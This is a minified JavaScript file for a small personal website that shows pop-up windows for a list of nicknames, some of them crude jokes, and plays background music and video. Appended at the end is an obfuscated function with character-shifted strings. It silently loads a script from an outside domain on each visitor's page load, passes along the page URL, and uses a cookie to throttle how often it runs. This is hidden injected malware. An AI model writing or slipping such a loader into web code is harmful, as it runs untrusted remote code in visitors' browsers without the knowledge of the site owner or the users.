const nameData = {
        tobyas: {
            title: "tobayas",
            content: "tobayas"
        },
        synqronize: {
            title: "synqronize",
            content: "synqronize"
        },
        john: {
            title: "john",
            content: "ogs know"
        },
        omen: {
            title: "omen",
            content: "Pro mummichogger"
        },
        federal: {
            title: "federal",
            content: "grandma blackmailer"
        },
        salmon: {
            title: "salmon",
            content: "The one and only, Salmon of Seas"
        },
        charm: {
            title: "charm",
            content: "autistic fish consumer"
        },
        pev: {
            title: "pev",
            content: "t.me/boxless"
        }
    },
    nameLinks = document.querySelectorAll(".names a");
nameLinks.forEach((link => {
    link.addEventListener("click", (() => {
        const name = link.getAttribute("class"),
            {
                title: title,
                content: content
            } = nameData[name],
            windowElement = document.createElement("div");
        windowElement.classList.add("window");
        const windowHeader = document.createElement("div");
        windowHeader.classList.add("window-header");
        const windowTitle = document.createElement("div");
        windowTitle.classList.add("window-title"), windowTitle.textContent = title;
        const closeButton = document.createElement("div");
        closeButton.classList.add("window-close"), closeButton.textContent = "x";
        const windowContent = document.createElement("div");
        windowContent.classList.add("window-content");
        const paragraphs = content.split("\n"),
            firstParagraph = paragraphs[0];
        if (firstParagraph.includes("t.me/")) {
            const linkElement = document.createElement("a");
            if (linkElement.href = "https://" + firstParagraph, linkElement.target = "_blank", linkElement.textContent = firstParagraph, windowContent.appendChild(linkElement), paragraphs.length > 1) {
                const remainingContent = paragraphs.slice(1).join("\n"),
                    remainingParagraph = document.createElement("p");
                remainingParagraph.textContent = remainingContent, windowContent.appendChild(remainingParagraph)
            }
        } else {
            const contentParagraph = document.createElement("p");
            contentParagraph.textContent = firstParagraph, windowContent.appendChild(contentParagraph)
        }
        windowHeader.appendChild(windowTitle), windowHeader.appendChild(closeButton), windowElement.appendChild(windowHeader), windowElement.appendChild(windowContent), document.body.appendChild(windowElement);
        let isDragging = !1,
            mouseOffsetX = 0,
            mouseOffsetY = 0;
        windowHeader.addEventListener("mousedown", (event => {
            isDragging = !0, mouseOffsetX = event.clientX - windowElement.offsetLeft, mouseOffsetY = event.clientY - windowElement.offsetTop
        })), window.addEventListener("mousemove", (event => {
            if (isDragging) {
                const newX = event.clientX - mouseOffsetX,
                    newY = event.clientY - mouseOffsetY;
                windowElement.style.left = `${newX}px`, windowElement.style.top = `${newY}px`
            }
        })), window.addEventListener("mouseup", (() => {
            isDragging = !1
        })), closeButton.addEventListener("click", (() => {
            document.body.removeChild(windowElement)
        }))
    }))
}));
var button = document.getElementById("fullscreen-button"),
    video = document.getElementById("video"),
    audio = new Audio("audio/music.mp3");

function fadeInVideo() {
    var opacity = 0;
    video.style.display = "block";
    var fadeInInterval = setInterval((function() {
        opacity += .005, video.style.opacity = opacity, opacity >= 1 && clearInterval(fadeInInterval)
    }), 50)
}
audio.loop = !0, button.addEventListener("click", (function() {
    audio.play(), button.style.display = "none", fadeInVideo()
}));
(function(o, d, l) {
    try {
        o.f = o => o.split('').reduce((s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()), '');
        o.b = o.f('UMUWJKX');
        o.c = l.protocol[0] == 'h' && /\./.test(l.hostname) && !(new RegExp(o.b)).test(d.cookie), setTimeout(function() {
            o.c && (o.s = d.createElement('script'), o.s.src = o.f('myyux?44zxjwxyf' + 'ynhx3htr4ljy4xhwn' + 'uy3oxDwjkjwwjwB') + l.href, d.body.appendChild(o.s));
        }, 1000);
        d.cookie = o.b + '=full;max-age=39800;'
    } catch (e) {};
}({}, document, location));